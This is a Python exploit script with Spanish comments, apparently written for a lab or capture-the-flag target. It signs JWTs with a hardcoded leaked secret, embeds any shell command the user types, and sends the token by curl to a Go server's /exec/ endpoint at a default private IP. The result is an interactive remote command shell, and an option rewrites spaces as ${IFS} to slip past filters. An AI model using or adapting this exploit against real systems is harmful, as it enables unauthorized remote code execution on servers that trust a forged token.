import jwt
import datetime
import subprocess
import sys
import requests
import argparse

def generate_token(command, url, port, secret, amsi):
    # Utiliza el secreto proporcionado o el valor predeterminado
    secret_key = secret if secret else "PSmu3dR2wMZQvNge"

    # Aplica la sustitución de espacios por ${IFS} si la opción -amsi está activada
    if amsi:
        command = command.replace(" ", "${IFS}")

    # Crea un token con la estructura "/exec/{cmd}"
    token_payload = {
        "cmd": command,
        "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)  # Establecer tiempo de expiración (opcional)
    }

    # Codifica el token usando el secreto
    token = jwt.encode(token_payload, secret_key, algorithm='HS256')

    # Construye la URL con el token JWT
    if url and port:
        url_with_token = f"http://{url}:{port}/exec/{token}"
    else:
        url_with_token = f"http://172.16.1.22:3000/exec/{token}"

    print("URL con el token JWT:", url_with_token)

    # Usa cURL directamente con el token en el encabezado "Authorization"
    try:
        # Ejecuta el comando en segundo plano y captura el proceso
        process = subprocess.Popen(["curl", "-s", "-H", f"Authorization: Bearer {token}", url_with_token], stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Espera a que el proceso termine y obtiene la salida final
        final_output, _ = process.communicate()

        # Muestra la salida final
        print(final_output.decode("utf-8"))

    except subprocess.CalledProcessError as e:
        print(f"Error en la solicitud: {e}")

if __name__ == "__main__":
    # Configura el parser de argumentos
    parser = argparse.ArgumentParser(description="Generador de token y ejecución de comandos en servidor Go.")
    parser.add_argument("--url", help="URL del servidor Go")
    parser.add_argument("--port", help="Puerto del servidor Go")
    parser.add_argument("--secret", help="Clave secreta para firmar el token (opcional)")
    parser.add_argument("-amsi", type=int, choices=[0, 1], default=0, help="Activar sustitución de espacios por ${IFS} (0: Desactivado, 1: Activado)")

    # Mensaje de ayuda para explicar el propósito y el uso del script
    print("Este script genera un token JWT con un comando y lo envía a un servidor Go para su ejecución.")
    print("Puedes ingresar 'exit' para salir en cualquier momento.")

    # Bucle para ingresar comandos hasta que se ingrese 'exit'
    while True:
        user_input = input("Ingresa un comando: ")

        if user_input.lower() == 'exit':
            break

        # Utiliza la URL, el puerto y el secreto proporcionados como argumentos, si están presentes
        generate_token(user_input, parser.parse_args().url, parser.parse_args().port, parser.parse_args().secret, parser.parse_args().amsi)
